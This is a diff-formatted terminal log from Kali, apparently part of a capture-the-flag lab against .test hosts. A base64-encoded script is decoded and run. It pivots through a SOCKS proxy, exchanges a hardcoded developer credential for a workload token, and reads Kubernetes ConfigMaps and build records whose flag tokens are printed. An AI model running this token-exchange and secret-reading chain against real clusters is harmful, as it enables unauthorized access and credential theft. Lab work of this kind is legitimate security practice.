@@ -1,0 +1,163 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/k13_4_cm.sh <<'B64EOF'
+> c2V0ICtlCkM9ImN1cmwgLXNTayAtbSAyMCAtLXNvY2tzNS1ob3N0bmFtZSAxMjcuMC4wLjE6MTA4MCIKQj1odHRwczovL2Nsb3VkLWFwaS5rZXBsZXJvcHMudGVzdApLPWh0dHBzOi8vY2xvdWQtYXBpLmtlcGxlcm9wcy50ZXN0OjY0NDMKVT0icm93YW4uaXRvOmZrX2RldmVsb3Blcl95VVdUS1NxcmMxNnkzSzVfNURmUTdxYWNmdDliLTl4byIKV1Q9JCgkQyAtbSAxMCAtdSAiJFUiIC1YIFBPU1QgLUggJ0NvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vanNvbicgLWQgJ3t9JyAiJEIvYXBpL3dvcmtzcGFjZXMvY3VycmVudC90b2tlbi1leGNoYW5nZSIgfCBweXRob24zIC1jICdpbXBvcnQgc3lzLGpzb247cHJpbnQoanNvbi5sb2FkKHN5cy5zdGRpbilbImFjY2Vzc190b2tlbiJdKScpCmVjaG8gIldUIGxlbiAkeyNXVH0iCmZvciBDTSBpbiBibGQtMTg0MiB0cnVzdC1mbHgtMDQ7IGRvCiBlY2hvICIjIyMjIyMjIyMjIENPTkZJR01BUCAkQ00iCiAkQyAtbSAxMCAtSCAiQXV0aG9yaXphdGlvbjogQmVhcmVyICRXVCIgLXcgJ1xuW0hUVFAgJXtodHRwX2NvZGV9XVxuJyAiJEsvYXBpL3YxL25hbWVzcGFjZXMvZmllbGRsaW5rL2NvbmZpZ21hcHMvJENNIgpkb25lCmVjaG8gIiMjIyMjIyMjIyMgQ0xPVUQtQVBJIGJ1aWxkLXJlY29yZCBCTEQtMTg0MiB3aXRoIHdvcmtsb2FkIHRva2VuIgpmb3IgSUQgaW4gQkxELTE4NDIgYmxkLTE4NDIgQkxELVJFTC03NDI7IGRvCiBlY2hvICItLS0gJElEIgogJEMgLW0gMTAgLUggIkF1dGhvcml6YXRpb246IEJlYXJlciAkV1QiIC13ICdcbltIVFRQICV7aHR0cF9jb2RlfV1cbicgIiRCL2FwaS9idWlsZC1yZWNvcmRzLyRJRCIKZG9uZQo=
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/k13_4_cm.sh; bash /tmp/k13_4_cm.sh; echo DONEMARK_1795201105645$((6*7))
+WT len 984
+########## CONFIGMAP bld-1842
+{
+  "kind": "ConfigMap",
+  "apiVersion": "v1",
+  "metadata": {
+    "name": "bld-1842",
+    "namespace": "fieldlink",
+    "uid": "f6a109e3-31a1-4a44-94d4-603847ca438e",
+    "resourceVersion": "10400",
+    "creationTimestamp": "2026-11-19T07:07:23Z",
+    "labels": {
+      "fieldkest.io/kind": "build-record"
+    },
+    "annotations": {
+      "kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"v1\",\"data\":{\"build_id\":\"BLD-1842\",\"principal\":\"svc-fieldlink-workload\",\"scope\":\"fieldkest-build-records\",\"version\":\"2026-09-18\",\"workspace\":\"fieldlink-workload\"},\"kind\":\"ConfigMap\",\"metadata\":{\"annotations\":{},\"labels\":{\"fieldkest.io/kind\":\"build-record\"},\"name\":\"bld-1842\",\"namespace\":\"fieldlink\"}}\n"
+    },
+    "managedFields": [
+      {
+        "manager": "kubectl-client-side-apply",
+        "operation": "Update",
+        "apiVersion": "v1",
+        "time": "2026-11-19T07:07:23Z",
+        "fieldsType": "FieldsV1",
+        "fieldsV1": {
+          "f:data": {
+            ".": {},
+            "f:build_id": {},
+            "f:principal": {},
+            "f:scope": {},
+            "f:version": {},
+            "f:workspace": {}
+          },
+          "f:metadata": {
+            "f:annotations": {
+              ".": {},
+              "f:kubectl.kubernetes.io/last-applied-configuration": {}
+            },
+            "f:labels": {
+              ".": {},
+              "f:fieldkest.io/kind": {}
+            }
+          }
+        }
+      },
+      {
+        "manager": "kubectl-patch",
+        "operation": "Update",
+        "apiVersion": "v1",
+        "time": "2026-11-19T13:42:23Z",
+        "fieldsType": "FieldsV1",
+        "fieldsV1": {
+          "f:data": {
+            "f:access_token": {}
+          }
+        }
+      }
+    ]
+  },
+  "data": {
+    "access_token": "FLAG{10a79b42b8e652b2}",
+    "build_id": "BLD-1842",
+    "principal": "svc-fieldlink-workload",
+    "scope": "fieldkest-build-records",
+    "version": "2026-09-18",
+    "workspace": "fieldlink-workload"
+  }
+}
+[HTTP 200]
+########## CONFIGMAP trust-flx-04
+{
+  "kind": "ConfigMap",
+  "apiVersion": "v1",
+  "metadata": {
+    "name": "trust-flx-04",
+    "namespace": "fieldlink",
+    "uid": "1ad6264c-0a6a-4243-846c-911720143704",
+    "resourceVersion": "10401",
+    "creationTimestamp": "2026-11-19T07:07:23Z",
+    "labels": {
+      "fieldkest.io/kind": "trust-record"
+    },
+    "annotations": {
+      "kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"v1\",\"data\":{\"accepted_audiences\":\"[\\\"https://kubernetes.default.svc.cluster.local\\\",\\\"k3s\\\"]\",\"export_role\":\"fieldkest-export-access\",\"issuer\":\"https://kubernetes.default.svc.cluster.local\",\"schema\":\"fieldkest.trust-record/v1\",\"service_ref\":\"fieldkest-exports\",\"subject\":\"system:serviceaccount:fieldlink:svc-fieldlink-workload\",\"trust_id\":\"TRUST-FLX-04\"},\"kind\":\"ConfigMap\",\"metadata\":{\"annotations\":{},\"labels\":{\"fieldkest.io/kind\":\"trust-record\"},\"name\":\"trust-flx-04\",\"namespace\":\"fieldlink\"}}\n"
+    },
+    "managedFields": [
+      {
+        "manager": "kubectl-client-side-apply",
+        "operation": "Update",
+        "apiVersion": "v1",
+        "time": "2026-11-19T07:07:23Z",
+        "fieldsType": "FieldsV1",
+        "fieldsV1": {
+          "f:data": {
+            ".": {},
+            "f:accepted_audiences": {},
+            "f:export_role": {},
+            "f:issuer": {},
+            "f:schema": {},
+            "f:service_ref": {},
+            "f:subject": {},
+            "f:trust_id": {}
+          },
+          "f:metadata": {
+            "f:annotations": {
+              ".": {},
+              "f:kubectl.kubernetes.io/last-applied-configuration": {}
+            },
+            "f:labels": {
+              ".": {},
+              "f:fieldkest.io/kind": {}
+            }
+          }
+        }
+      },
+      {
+        "manager": "kubectl-patch",
+        "operation": "Update",
+        "apiVersion": "v1",
+        "time": "2026-11-19T13:42:23Z",
+        "fieldsType": "FieldsV1",
+        "fieldsV1": {
+          "f:data": {
+            "f:access_token": {}
+          }
+        }
+      }
+    ]
+  },
+  "data": {
+    "accepted_audiences": "[\"https://kubernetes.default.svc.cluster.local\",\"k3s\"]",
+    "access_token": "FLAG{418e19c3ed0c13ef}",
+    "export_role": "fieldkest-export-access",
+    "issuer": "https://kubernetes.default.svc.cluster.local",
+    "schema": "fieldkest.trust-record/v1",
+    "service_ref": "fieldkest-exports",
+    "subject": "system:serviceaccount:fieldlink:svc-fieldlink-workload",
+    "trust_id": "TRUST-FLX-04"
+  }
+}
+[HTTP 200]
+########## CLOUD-API build-record BLD-1842 with workload token
+--- BLD-1842
+{"access_token":"FLAG{10a79b42b8e652b2}","build_id":"BLD-1842","principal":"svc-fieldlink-workload","schema":"fieldkest.build-record/v1","scope":"fieldkest-build-records","version":"2026-09-18","workspace":"fieldlink-workload"}
+
+[HTTP 200]
+--- bld-1842
+{"access_token":"FLAG{10a79b42b8e652b2}","build_id":"BLD-1842","principal":"svc-fieldlink-workload","schema":"fieldkest.build-record/v1","scope":"fieldkest-build-records","version":"2026-09-18","workspace":"fieldlink-workload"}
+
+[HTTP 200]
+--- BLD-REL-742
+{"error":"authentication_required"}
+
+[HTTP 401]
